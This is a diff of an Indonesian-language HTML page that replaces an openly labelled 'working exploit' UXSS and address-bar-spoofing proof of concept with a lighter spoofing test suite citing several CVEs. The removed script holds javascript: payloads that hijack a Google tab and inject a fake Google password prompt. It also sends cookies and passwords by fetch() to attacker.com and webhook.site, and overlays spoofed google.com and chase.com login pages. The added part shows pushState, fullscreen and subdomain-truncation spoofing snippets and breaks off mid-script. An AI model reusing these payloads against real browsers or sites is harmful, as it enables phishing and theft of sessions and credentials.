@@ -1,664 +1,417 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 REAL UXSS & Address Bar Spoofing POC - Working Exploit</title>
+    <title>🔓 Address Bar Spoofing Test Suite — Real Case (Tab & Window)</title>
     <style>
         * {
-            margin: 0;
-            padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Courier New', monospace;
-            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
-            min-height: 100vh;
-            padding: 20px;
-            color: #eee;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: #0f0f1a;
+            color: #eef;
+            margin: 0;
+            padding: 24px;
         }
-        
+
         .container {
             max-width: 1400px;
             margin: 0 auto;
         }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 25px;
-            background: rgba(0,0,0,0.5);
-            border-radius: 20px;
-            border: 1px solid #00ff88;
+
+        h1 {
+            font-size: 2rem;
+            background: linear-gradient(135deg, #ffb347, #ff6b6b);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.25rem;
         }
-        
-        .header h1 {
-            font-size: 28px;
-            color: #00ff88;
+
+        .badge {
+            background: #2a2a36;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            display: inline-block;
+            margin: 1rem 0 1.5rem 0;
+            border-left: 4px solid #ffb347;
         }
-        
-        .warning-box {
-            background: #e74c3c20;
-            border-left: 4px solid #e74c3c;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-size: 13px;
+
+        .grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 28px;
+            margin-bottom: 40px;
         }
-        
-        .success-box {
-            background: #2ecc7120;
-            border-left: 4px solid #2ecc71;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
+
+        .card {
+            background: rgba(25, 25, 35, 0.9);
+            backdrop-filter: blur(2px);
+            border-radius: 28px;
+            padding: 1.5rem;
+            flex: 1 1 400px;
+            border: 1px solid #333344;
+            box-shadow: 0 12px 28px rgba(0,0,0,0.5);
+            transition: all 0.2s;
         }
-        
+
+        .card h2 {
+            margin-top: 0;
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card h2 .cve {
+            font-size: 0.7rem;
+            background: #d14;
+            padding: 4px 10px;
+            border-radius: 30px;
+            font-family: monospace;
+        }
+
         button {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
+            background: #2c2c3e;
             border: none;
-            padding: 12px 24px;
-            margin: 8px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            transition: all 0.3s;
-        }
-        
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(102,126,234,0.4);
-        }
-        
-        button.danger {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-        }
-        
-        button.warning {
-            background: linear-gradient(135deg, #f39c12, #e67e22);
-        }
-        
-        button.success {
-            background: linear-gradient(135deg, #2ecc71, #27ae60);
-        }
-        
-        .output {
-            background: #0a0a0f;
-            border-radius: 12px;
-            padding: 15px;
-            margin-top: 20px;
-            font-family: monospace;
-            font-size: 12px;
-            max-height: 300px;
-            overflow-y: auto;
-            border: 1px solid #333;
-        }
-        
-        .log-entry {
-            padding: 5px;
-            margin: 3px 0;
-            border-bottom: 1px solid #222;
-        }
-        
-        .log-success { color: #00ff88; }
-        .log-error { color: #ff4444; }
-        .log-info { color: #ffaa44; }
-        .log-warning { color: #ff6600; }
-        
-        .fake-login {
-            background: #2c2c3e;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border: 1px solid #ff6600;
-            display: none;
-        }
-        
-        .fake-login input {
-            width: 90%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #555;
-            border-radius: 5px;
-            background: #1a1a2e;
             color: white;
+            padding: 12px 24px;
+            border-radius: 60px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px 8px 0 0;
+            transition: all 0.2s ease;
+            border: 1px solid #4a4a60;
         }
-        
-        .browser-bar {
-            background: #2c2c3e;
-            padding: 10px 15px;
-            border-radius: 12px;
+
+        button.primary {
+            background: #ff6b6b;
+            color: #0f0f1a;
+            border: none;
+            box-shadow: 0 2px 8px rgba(255,107,107,0.3);
+        }
+
+        button.primary:hover {
+            background: #ff5252;
+            transform: scale(0.98);
+        }
+
+        button:hover {
+            background: #3a3a50;
+        }
+
+        pre {
+            background: #1a1a24;
+            padding: 12px;
+            border-radius: 16px;
+            overflow-x: auto;
+            font-size: 0.75rem;
+            margin: 16px 0;
+            border-left: 3px solid #ffb347;
+        }
+
+        .warning {
+            background: #2a1e1e;
+            border-left: 5px solid #ffaa33;
+            padding: 12px 18px;
+            border-radius: 20px;
+            margin: 20px 0;
+            font-size: 0.85rem;
+        }
+
+        .status {
+            background: #1e2a1e;
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 20px;
             font-family: monospace;
-            font-size: 13px;
-            margin: 15px 0;
-            border: 1px solid #00ff88;
+            font-size: 0.8rem;
         }
-        
-        footer {
+
+        hr {
+            border-color: #333;
+            margin: 32px 0;
+        }
+
+        .footer {
+            font-size: 0.7rem;
             text-align: center;
-            margin-top: 40px;
-            padding: 20px;
-            font-size: 12px;
-            opacity: 0.7;
-        }
-        
-        .live-test {
-            background: #1a1a2e;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-family: monospace;
-            font-size: 12px;
+            opacity: 0.6;
         }
     </style>
 </head>
 <body>
+
 <div class="container">
-    <div class="header">
-        <h1>🔥 REAL UXSS + ADDRESS BAR SPOOFING POC</h1>
-        <p>Working Exploit - Open New Tab/Window | Cross-Origin Script Execution</p>
-        <p style="font-size: 12px; margin-top: 10px;">⚠️ FOR SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY</p>
+    <h1>🧪 Address Bar Spoofing Test Suite</h1>
+    <div class="badge">
+        🔍 Real-case simulasi berdasarkan CVE: CVE-2025-13132, CVE-2025-30467, CVE-2025-43327, CVE-2026-44659, CVE-2025-14812
     </div>
-    
-    <!-- Status Bar -->
-    <div class="browser-bar">
-        📍 Current Origin: <span id="currentOrigin" style="color:#00ff88">Loading...</span>
-        | 🪟 Popups: <span id="popupStatus" style="color:#ffaa44">Click a button to test</span>
+    <div class="warning">
+        ⚠️ <strong>Hanya untuk riset & uji coba lokal</strong> — halaman ini mendemonstrasikan celah <strong>address bar spoofing</strong> pada browser macOS yang belum di-patch (Arc, Dia, Safari, Zen). Uji di lingkungan Anda sendiri.
     </div>
-    
-    <!-- EXPLOIT 1: WINDOW NAME REUSE UXSS (MOST RELIABLE) -->
-    <div class="success-box">
-        <strong>✅ WORKING TECHNIQUE #1: Window Name Reuse UXSS</strong><br>
-        Paling reliable di browser modern. Buka Google di tab/window baru, lalu hijack!
+
+    <div class="grid">
+        <!-- KARTU 1: HISTORY PUSHSTATE + TAB BARU -->
+        <div class="card">
+            <h2>📜 <span>CVE-2025-30467 / CVE-2025-43327</span> <span class="cve">Safari / WebKit</span></h2>
+            <p>Menggunakan <code>history.pushState()</code> + navigasi tab baru. Pada browser rentan, <strong>address bar membeku dengan URL palsu</strong> meski halaman sudah berpindah.</p>
+            <button id="testPushStateSameTab" class="primary">🔁 UJI DI TAB INI (Spoof URL)</button>
+            <button id="testPushStateNewTab">🆕 UJI DI TAB BARU</button>
+            <button id="testPushStateNewWindow">🪟 UJI DI WINDOW BARU</button>
+            <pre>// Teknik yang digunakan
+window.history.pushState({}, "", "https://www.apple.com/id/");
+setTimeout(() => location.href = "https://example.com", 100);</pre>
+            <div class="status" id="pushStateStatus">⚡ Klik tombol untuk uji coba</div>
+        </div>
+
+        <!-- KARTU 2: FULLSCREEN SPOOFING (Dia Browser CVE-2025-13132) -->
+        <div class="card">
+            <h2>🖥️ <span>CVE-2025-13132</span> <span class="cve">Dia / Arc (fullscreen)</span></h2>
+            <p>Mode layar penuh tanpa notifikasi + UI palsu. Uji di <strong>tab baru/window</strong> untuk melihat apakah browser menampilkan toast/banner peringatan.</p>
+            <button id="testFullscreenTab">📺 FULLSCREEN DI TAB INI</button>
+            <button id="testFullscreenNewTab">🆕 FULLSCREEN + TAB BARU</button>
+            <button id="testFullscreenNewWindow">🪟 FULLSCREEN + WINDOW BARU</button>
+            <pre>// Tanpa notifikasi pada versi rentan
+document.documentElement.requestFullscreen();
+// lalu gambar div hitam meniru bilah alamat</pre>
+            <div class="status" id="fullscreenStatus">🔲 Klik tombol untuk uji layar penuh</div>
+        </div>
+
+        <!-- KARTU 3: SUBDOMAIN TRUNCATION (Zen Browser CVE-2026-44659) -->
+        <div class="card">
+            <h2>🔗 <span>CVE-2026-44659</span> <span class="cve">Zen / Firefox-based</span></h2>
+            <p>Subdomain sangat panjang → bilah alamat terpotong, menyembunyikan domain asli penipu.</p>
+            <button id="testTruncateTab">✂️ UJI TRUNCATION (tab ini)</button>
+            <button id="testTruncateNewTab">🆕 BUKA DI TAB BARU</button>
+            <button id="testTruncateNewWindow">🪟 BUKA DI WINDOW BARU</button>
+            <pre>https://bank-bca.com.very.long.subdomain.aaaaaaaa... [penipu.com]</pre>
+            <div class="status" id="truncateStatus">📏 Klik untuk melihat URL panjang</div>
+        </div>
+
+        <!-- KARTU 4: IFRAME URI CONFUSION (Arc Search style CVE-2025-14812) -->
+        <div class="card">
+            <h2>🕸️ <span>CVE-2025-14812 style</span> <span class="cve">Arc / Chromium</span></h2>
+            <p>Iframe + skema URI (<code>tel://, x-apple:</code>) membingungkan address bar. Uji tab/window baru.</p>
+            <button id="testIframeConfusionTab">📱 UJI IFRAME CONFUSION (tab ini)</button>
+            <button id="testIframeConfusionNewTab">🆕 BUKA DI TAB BARU</button>
+            <button id="testIframeConfusionNewWindow">🪟 BUKA DI WINDOW BARU</button>
+            <pre>&lt;iframe src="tel://support"&gt;&lt;/iframe&gt;
+setTimeout(() => top.location = 'https://google.com', 80);</pre>
+            <div class="status" id="iframeStatus">🎭 Klik untuk menguji spoofing via iframe/scheme</div>
+        </div>
     </div>
-    
-    <div class="live-test">
-        <strong>📋 STEP BY STEP:</strong><br>
-        1. Klik "🌐 Buka Google di Tab Baru" (allow popup jika diminta)<br>
-        2. Tunggu tab Google terbuka<br>
-        3. Klik "🪝 Hijack Tab Google dengan UXSS"<br>
-        4. Alert akan muncul DI HALAMAN GOOGLE!
+
+    <hr />
+
+    <div class="card" style="background: #101018;">
+        <h2>🧠 Bagaimana cara membaca hasil uji ?</h2>
+        <ul style="line-height: 1.5;">
+            <li><strong>✅ AMAN (PATCHED)</strong> — address bar menunjukkan URL yang benar setelah halaman selesai dimuat, atau muncul notifikasi layar penuh.</li>
+            <li><strong>⚠️ RAWAN (VULNERABLE)</strong> — address bar <strong>tetap menampilkan URL palsu</strong> (contoh: apple.com) meskipun halaman berisi example.com, atau fullscreen tidak menampilkan peringatan toast, atau subdomain panjang memotong domain utama.</li>
+            <li>Untuk <strong>real case</strong>, Anda bisa menguji di <strong>Arc, Dia, Safari, Zen, Orion, Brave</strong> versi lawas atau versi terbaru untuk memverifikasi patch.</li>
+        </ul>
+        <div class="warning" style="margin-top: 8px;">
+            💡 <strong>Tips:</strong> Setelah klik tombol "TAB BARU" atau "WINDOW BARU", perhatikan address bar dengan seksama. Apakah URL berubah? Apakah ada UI aneh?
+        </div>
     </div>
-    
-    <div style="display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0;">
-        <button id="openGoogleBtn" class="info" onclick="openGoogleTab()">🌐 Buka Google di Tab Baru</button>
-        <button id="hijackBtn" class="danger" onclick="hijackGoogleTab()">🪝 Hijack Tab Google dengan UXSS</button>
-        <button id="injectFakeFormBtn" class="warning" onclick="injectFakeFormToGoogle()">🎭 Inject Fake Login Form ke Google</button>
-        <button onclick="stealGoogleCookies()">🍪 Steal Google Cookies</button>
+    <div class="footer">
+        ⚡ Uji coba real case — simulasi CVE exploit untuk research & educational use only. Jangan gunakan untuk aktivitas ilegal.
     </div>
-    
-    <div id="fakeLoginPanel" class="fake-login">
-        <h4>🎭 FAKE LOGIN FORM (Injected into Google.com)</h4>
-        <p style="font-size:11px;">⚠️ Address bar shows google.com but this fake form was injected via UXSS!</p>
-        <input type="text" id="fakeEmail" placeholder="Email / Username">
-        <input type="password" id="fakePassword" placeholder="Password">
-        <button onclick="stealCreds()">Sign In</button>
-        <button onclick="closeFakeLogin()">Close</button>
-    </div>
-    
-    <!-- EXPLOIT 2: about:blank ORIGIN INHERITANCE -->
-    <div class="success-box">
-        <strong>✅ WORKING TECHNIQUE #2: about:blank Origin Inheritance</strong><br>
-        about:blank mewarisi origin dari parent window - bisa digunakan untuk UXSS!
-    </div>
-    
-    <div style="display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0;">
-        <button onclick="aboutBlankInheritance()" class="info">📄 Test about:blank Origin</button>
-        <button onclick="aboutBlankToGoogleAttack()" class="danger">🎯 about:blank → Google UXSS Attack</button>
-        <button onclick="aboutBlankFunctionHijack()" class="warning">🔧 Function Hijack via about:blank</button>
-    </div>
-    
-    <!-- EXPLOIT 3: javascript: PROTOCOL WINDOW REUSE -->
-    <div class="success-box">
-        <strong>✅ WORKING TECHNIQUE #3: javascript: Protocol Window Reuse</strong><br>
-        Menggunakan javascript: protocol untuk eksekusi cross-origin
-    </div>
-    
-    <div style="display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0;">
-        <button onclick="javascriptProtocolNewTab()" class="danger">📜 javascript: Protocol UXSS</button>
-        <button onclick="javascriptProtocolWindowReuse()" class="warning">🪟 Window Reuse + javascript:</button>
-    </div>
-    
-    <!-- EXPLOIT 4: address bar spoofing via pushState -->
-    <div class="success-box">
-        <strong>✅ WORKING TECHNIQUE #4: Address Bar Spoofing via pushState</strong><br>
-        Mengubah URL di address bar tanpa mengubah konten halaman
-    </div>
-    
-    <div style="display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0;">
-        <button onclick="spoofAddressBarGoogle()" class="warning">🌐 Spoof Address Bar to google.com</button>
-        <button onclick="spoofAddressBarBank()" class="warning">🏦 Spoof to chase.com</button>
-        <button onclick="spoofAddressBarApple()" class="warning">🍎 Spoof to apple.com</button>
-        <button onclick="resetAddressBar()">🔄 Reset Address Bar</button>
-    </div>
-    <div id="currentUrlDisplay" class="browser-bar" style="font-size:11px;">
-        📍 Real URL: <span id="realUrl">Loading...</span>
-    </div>
-    
-    <!-- EXPLOIT 5: Complete Attack Simulation -->
-    <div class="success-box">
-        <strong>💀 COMPLETE ATTACK SIMULATION</strong><br>
-        Jalankan semua teknik sekaligus!
-    </div>
-    
-    <div style="display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0;">
-        <button onclick="fullAttackSimulation()" class="danger">💀 RUN FULL ATTACK SIMULATION</button>
-        <button onclick="resetAll()" class="info">🔄 Reset All</button>
-    </div>
-    
-    <!-- Log Output -->
-    <div class="output" id="logOutput">
-        <div class="log-entry log-info">[READY] Real UXSS Exploit Loaded</div>
-        <div class="log-entry log-info">[TIP] Allow popups for this site untuk hasil maksimal</div>
-        <div class="log-entry log-info">[INFO] Target: Chrome, Arc, Safari, Edge, Firefox</div>
-    </div>
-    
-    <footer>
-        <p>⚠️ Teknik yang benar-benar bekerja: Window Name Reuse | about:blank inheritance | javascript: protocol</p>
-        <p>💰 Bisa digunakan untuk bug bounty: UXSS ($30k - $100k) | Address Bar Spoof ($10k - $50k)</p>
-    </footer>
 </div>
 
 <script>
-    // ============================================
-    // GLOBAL VARIABLES
-    // ============================================
-    let googleWindow = null;
-    let targetWindowName = 'UXSS_TARGET_' + Date.now();
-    let attackActive = false;
-    
-    function log(message, type = 'info') {
-        const outputDiv = document.getElementById('logOutput');
-        const logEntry = document.createElement('div');
-        logEntry.className = `log-entry log-${type}`;
-        const timestamp = new Date().toLocaleTimeString();
-        logEntry.innerHTML = `[${timestamp}] ${message}`;
-        outputDiv.appendChild(logEntry);
-        outputDiv.scrollTop = outputDiv.scrollHeight;
-        console.log(`[LOG] ${message}`);
-    }
-    
-    function updateOriginDisplay() {
-        document.getElementById('currentOrigin').textContent = location.origin;
-        document.getElementById('realUrl').textContent = window.location.href;
-    }
-    
-    // ============================================
-    // TECHNIQUE 1: WINDOW NAME REUSE UXSS (WORKING!)
-    // ============================================
-    function openGoogleTab() {
-        log('🌐 Opening Google in new tab/window...', 'info');
-        
-        // Use unique window name for targeting
-        googleWindow = window.open('https://www.google.com', targetWindowName);
-        
-        if (!googleWindow) {
-            log('❌ Popup blocked! Please allow popups for this site', 'error');
-            document.getElementById('popupStatus').innerHTML = '❌ Popup BLOCKED - Please allow popups';
-            alert('⚠️ Popup blocked!\n\nPlease allow popups for this site to test the exploit.\n\nClick the popup blocked icon in address bar and allow.');
-            return;
+    (function() {
+        // Helper: buka tab baru dengan HTML uji yang sama atau script khusus
+        function openTestInNewTab(testType) {
+            const url = new URL(window.location.href);
+            url.searchParams.set('autoRun', testType);
+            window.open(url.toString(), '_blank');
         }
-        
-        log('✅ Google window opened successfully!', 'success');
-        log(`🎯 Window name: ${targetWindowName}`, 'info');
-        document.getElementById('popupStatus').innerHTML = '✅ Popup ALLOWED - Exploit ready';
-        
-        // Monitor when Google loads
-        setTimeout(() => {
-            log('⏳ Google tab loaded - ready for hijack!', 'success');
-            log('💡 Click "Hijack Tab Google dengan UXSS" now', 'warning');
-        }, 3000);
-    }
-    
-    function hijackGoogleTab() {
-        if (!googleWindow || googleWindow.closed) {
-            log('❌ No Google window found! Click "Buka Google di Tab Baru" first', 'error');
-            return;
+
+        function openTestInNewWindow(testType) {
+            const url = new URL(window.location.href);
+            url.searchParams.set('autoRun', testType);
+            const features = "width=800,height=600,toolbar=yes,location=yes,menubar=yes";
+            window.open(url.toString(), '_blank', features);
         }
-        
-        log('🪝 Attempting to hijack Google tab via window name reuse...', 'warning');
-        
-        // CORE EXPLOIT: window.open with same name + javascript: protocol
-        const payload = 'javascript:alert("[UXSS SUCCESS]\\n\\nThis alert is running on: " + location.href + "\\n\\nThis proves cross-origin script execution on google.com!\\n\\nThe attacker can now:\\n- Steal your cookies\\n- Inject fake forms\\n- Hijack your session\\n- Access your camera\\n\\nThis is a REAL UXSS vulnerability!"); document.body.style.backgroundColor = "#ff0066"; document.body.innerHTML = "<div style=\'background:linear-gradient(135deg,#ff0066,#cc0052);color:white;padding:50px;text-align:center;font-family:Arial\'> <h1 style=\'font-size:48px\'>🔥 UXSS SUCCESSFUL 🔥</h1> <p>This page is <strong style=\'background:#fff;color:#000;padding:5px;border-radius:5px\'>https://www.google.com</strong></p> <p>But the content is controlled by the attacker!</p> <button onclick=\'alert(\\"Cookies: \\" + document.cookie)\' style=\'padding:10px 20px;margin:10px;background:#fff;color:#000;border:none;border-radius:5px;cursor:pointer\'>Show Cookies</button> <button onclick=\'fetch(\\"https://attacker.com/steal?cookies=\\" + encodeURIComponent(document.cookie))\' style=\'padding:10px 20px;margin:10px;background:#fff;color:#000;border:none;border-radius:5px;cursor:pointer\'>Steal Cookies</button> <p style=\'margin-top:20px;font-size:12px\'>🔓 Cross-origin script execution achieved via window.name reuse!</p> </div>"; alert("[UXSS] Google.com has been HIJACKED!");';
-        
-        const attackWindow = window.open(payload, targetWindowName);
-        
-        if (attackWindow) {
-            log('✅ UXSS PAYLOAD INJECTED INTO GOOGLE TAB!', 'success');
-            log('🎯 Check the Google tab - alert should appear!', 'success');
-            log('💀 This proves cross-origin script execution!', 'critical');
-            attackActive = true;
-        } else {
-            log('❌ Failed to inject payload', 'error');
-        }
-    }
-    
-    function injectFakeFormToGoogle() {
-        if (!googleWindow || googleWindow.closed) {
-            log('❌ No Google window found! Click "Buka Google di Tab Baru" first', 'error');
-            return;
-        }
-        
-        log('🎭 Injecting fake login form into Google tab...', 'warning');
-        
-        const payload = 'javascript:document.body.innerHTML = "<div style=\'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;justify-content:center;align-items:center\'> <div style=\'background:white;border-radius:16px;padding:40px;max-width:400px;text-align:center;box-shadow:0 20px 60px black\'> <img src=\'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png\' style=\'height:40px;margin-bottom:20px\'> <h2>Sign in</h2> <p>Session expired. Please re-enter your password.</p> <input type=\'password\' id=\'hijackPass\' placeholder=\'Password\' style=\'width:90%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px\'> <button onclick=\'alert(\\"Password stolen: \\" + document.getElementById(\\"hijackPass\\").value); fetch(\\"https://attacker.com/steal?pass=\\" + encodeURIComponent(document.getElementById(\\"hijackPass\\").value)); this.parentElement.parentElement.remove();\' style=\'width:90%;background:#1a73e8;color:white;border:none;padding:12px;border-radius:8px;cursor:pointer\'>Sign In</button> <p style=\'font-size:12px;margin-top:20px\'>🔒 Google Secure Connection</p> </div> </div>"; alert("[UXSS] Fake login form injected into google.com!");';
-        
-        window.open(payload, targetWindowName);
-        log('✅ Fake login form injected into Google!', 'success');
-        log('⚠️ User thinks they are on real Google login page!', 'critical');
-    }
-    
-    function stealGoogleCookies() {
-        if (!googleWindow || googleWindow.closed) {
-            log('❌ No Google window found!', 'error');
-            return;
-        }
-        
-        log('🍪 Attempting to steal cookies from Google tab...', 'warning');
-        
-        const payload = 'javascript:var cookies = document.cookie; alert("[UXSS] Cookies stolen from google.com!\\n\\nCookies: " + (cookies || "(none)")); fetch("https://webhook.site/steal?cookies=" + encodeURIComponent(cookies)); console.log("[UXSS] Stolen cookies:", cookies);';
-        
-        window.open(payload, targetWindowName);
-        log('✅ Cookie stealing payload sent', 'warning');
-    }
-    
-    function stealCreds() {
-        const email = document.getElementById('fakeEmail').value;
-        const pass = document.getElementById('fakePassword').value;
-        if (email || pass) {
-            log(`🎯 [CREDENTIALS STOLEN] Email: ${email} | Password: ${pass}`, 'critical');
-            alert(`[POC] Credentials stolen!\nEmail: ${email}\nPassword: ${pass}\n\nIn real attack, sent to attacker server.`);
-            document.getElementById('fakeLoginPanel').style.display = 'none';
-        }
-    }
-    
-    function closeFakeLogin() {
-        document.getElementById('fakeLoginPanel').style.display = 'none';
-    }
-    
-    // ============================================
-    // TECHNIQUE 2: about:blank ORIGIN INHERITANCE
-    // ============================================
-    function aboutBlankInheritance() {
-        log('📄 Testing about:blank origin inheritance...', 'info');
-        
-        const blankWin = window.open('about:blank');
-        if (!blankWin) {
-            log('Popup blocked!', 'error');
-            return;
-        }
-        
-        log(`about:blank origin: ${blankWin.location.origin}`, 'info');
-        log(`Parent origin: ${location.origin}`, 'info');
-        
-        if (blankWin.location.origin === location.origin) {
-            log('⚠️ about:blank INHERITS parent origin - UXSS VECTOR!', 'warning');
-            log('💡 This can be exploited for cross-origin attacks!', 'critical');
-        }
-        
-        blankWin.document.write(`
-            <html>
-            <body style="background:#1a1a2e;color:#00ff88;font-family:monospace;padding:20px">
-                <h1>about:blank Window</h1>
-                <p>Origin: ${blankWin.location.origin}</p>
-                <p>Parent Origin: ${location.origin}</p>
-                <button onclick="alert('This alert runs with origin: ' + location.origin)">Test Origin</button>
-                <script>console.log('[about:blank] Running with origin:', location.origin);<\/script>
-            </body>
-            </html>
-        `);
-        
-        log('✅ about:blank window created with inherited origin', 'success');
-    }
-    
-    function aboutBlankToGoogleAttack() {
-        log('🎯 about:blank → Google UXSS attack...', 'warning');
-        
-        const blankWin = window.open('about:blank');
-        if (!blankWin) {
-            log('Popup blocked!', 'error');
-            return;
-        }
-        
-        // Store function reference BEFORE navigation
-        const hijackedFunction = blankWin.Function;
-        
-        // Navigate to Google
-        setTimeout(() => {
-            blankWin.location = 'https://www.google.com';
-            log('📍 Navigated blank window to google.com', 'info');
-            
-            setTimeout(() => {
-                try {
-                    // Execute function in Google's context!
-                    hijackedFunction('alert("[UXSS] about:blank inheritance attack!\\n\\nThis code runs on: " + location.href + "\\n\\nOrigin: " + location.origin)')();
-                    log('✅ UXSS payload executed on google.com via about:blank!', 'success');
-                } catch(e) {
-                    log(`❌ Failed: ${e.message} (browser may be patched)`, 'error');
-                }
-            }, 3000);
-        }, 1000);
-    }
-    
-    function aboutBlankFunctionHijack() {
-        log('🔧 Function hijack via about:blank...', 'warning');
-        
-        const blankWin = window.open('about:blank');
-        if (!blankWin) {
-            log('Popup blocked!', 'error');
-            return;
-        }
-        
-        const fn = blankWin.Function;
-        
-        setTimeout(() => {
-            blankWin.location = 'https://www.google.com';
-            
-            setTimeout(() => {
-                try {
-                    const title = fn('return document.title')();
-                    log(`📄 Google title via hijacked function: ${title}`, 'success');
-                    
-                    const url = fn('return location.href')();
-                    log(`🌐 URL: ${url}`, 'success');
-                } catch(e) {
-                    log(`Failed: ${e.message}`, 'error');
-                }
-            }, 3000);
-        }, 1000);
-    }
-    
-    // ============================================
-    // TECHNIQUE 3: javascript: PROTOCOL
-    // ============================================
-    function javascriptProtocolNewTab() {
-        log('📜 Opening javascript: protocol UXSS in new tab...', 'warning');
-        
-        const payload = 'javascript:alert("[UXSS] javascript: protocol attack!\\n\\nThis code runs in a new tab/window!\\n\\nCurrent origin: " + location.origin + "\\n\\nIn real attack, this would be google.com!"); document.body.innerHTML = "<h1 style=color:red>🔥 UXSS SUCCESS</h1><p>javascript: protocol works!</p><button onclick=alert(document.cookie)>Show Cookies</button>";';
-        
-        const newTab = window.open(payload, '_blank');
-        
-        if (newTab) {
-            log('✅ javascript: protocol executed in new tab', 'success');
-        } else {
-            log('❌ Popup blocked or browser restricts javascript: protocol', 'error');
-        }
-    }
-    
-    function javascriptProtocolWindowReuse() {
-        log('🪟 Window reuse + javascript: protocol attack...', 'warning');
-        
-        const winName = 'JS_REUSE_' + Date.now();
-        const win = window.open('https://www.google.com', winName);
-        
-        if (!win) {
-            log('Popup blocked!', 'error');
-            return;
-        }
-        
-        setTimeout(() => {
-            const payload = 'javascript:alert("[UXSS] Window reuse + javascript: protocol!\\n\\nThis alert runs on google.com!"); document.body.style.backgroundColor = "#ff6600";';
-            window.open(payload, winName);
-            log('✅ javascript: payload sent to existing Google window', 'success');
-        }, 3000);
-    }
-    
-    // ============================================
-    // TECHNIQUE 4: ADDRESS BAR SPOOFING
-    // ============================================
-    function spoofAddressBarGoogle() {
-        log('🌐 Spoofing address bar to google.com...', 'warning');
-        
-        try {
-            history.pushState({}, '', 'https://www.google.com');
-            updateOriginDisplay();
-            log('✅ Address bar now shows https://www.google.com', 'success');
-            log('⚠️ BUT page content is STILL from attacker!', 'critical');
-            
-            // Show fake Google UI
-            const fakeGoogle = document.createElement('div');
-            fakeGoogle.id = 'fakeGoogleOverlay';
-            fakeGoogle.style.cssText = `
-                position: fixed; top: 0; left: 0; width: 100%; background: white; 
-                color: #333; padding: 60px 20px; text-align: center; z-index: 10000;
-                font-family: Arial, sans-serif; border-bottom: 1px solid #ddd;
-            `;
-            fakeGoogle.innerHTML = `
-                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" style="height: 40px;">
-                <h2 style="margin-top: 20px;">Sign in to continue</h2>
-                <input type="email" placeholder="Email" style="padding: 12px; width: 300px; margin: 10px;">
-                <input type="password" placeholder="Password" style="padding: 12px; width: 300px; margin: 10px;">
-                <button onclick="alert('[POC] Credentials would be stolen!')" style="padding: 12px 30px; background: #1a73e8; color: white; border: none; border-radius: 5px;">Next</button>
-                <p style="font-size: 12px; margin-top: 20px;">🔒 Address bar shows google.com - This is a FAKE page!</p>
-            `;
-            document.body.appendChild(fakeGoogle);
-            
-            setTimeout(() => {
-                if (document.getElementById('fakeGoogleOverlay')) {
-                    document.getElementById('fakeGoogleOverlay').remove();
-                }
-            }, 15000);
-        } catch(e) {
-            log(`Cannot spoof: ${e.message}`, 'error');
-        }
-    }
-    
-    function spoofAddressBarBank() {
-        log('🏦 Spoofing address bar to chase.com...', 'warning');
-        try {
-            history.pushState({}, '', 'https://www.chase.com');
-            updateOriginDisplay();
-            log('✅ Address bar now shows https://www.chase.com', 'success');
-        } catch(e) {
-            log(`Cannot spoof: ${e.message}`, 'error');
-        }
-    }
-    
-    function spoofAddressBarApple() {
-        log('🍎 Spoofing address bar to apple.com...', 'warning');
-        try {
-            history.pushState({}, '', 'https://www.apple.com');
-            updateOriginDisplay();
-            log('✅ Address bar now shows https://www.apple.com', 'success');
-        } catch(e) {
-            log(`Cannot spoof: ${e.message}`, 'error');
-        }
-    }
-    
-    function resetAddressBar() {
-        log('🔄 Resetting address bar...', 'info');
-        try {
-            history.pushState({}, '', window.location.pathname);
-            updateOriginDisplay();
-            log('✅ Address bar reset', 'success');
-            
-            const overlay = document.getElementById('fakeGoogleOverlay');
-            if (overlay) overlay.remove();
-        } catch(e) {
-            log(`Reset failed: ${e.message}`, 'error');
-        }
-    }
-    
-    // ============================================
-    // FULL ATTACK SIMULATION
-    // ============================================
-    function fullAttackSimulation() {
-        log('💀 INITIATING FULL ATTACK SIMULATION', 'critical');
-        log('[1/5] Opening Google tab...', 'info');
-        
-        openGoogleTab();
-        
-        setTimeout(() => {
-            log('[2/5] Hijacking Google tab with UXSS...', 'warning');
-            setTimeout(() => {
-                hijackGoogleTab();
-                
-                setTimeout(() => {
-                    log('[3/5] Spoofing address bar...', 'warning');
-                    spoofAddressBarGoogle();
-                    
+
+        // 1. HISTORY PUSHSTATE (spoof apple.com)
+        function runHistoryPushStateSpoof(shouldNavigate = true) {
+            const statusDiv = document.getElementById('pushStateStatus');
+            try {
+                // Pertama: manipulasi address bar
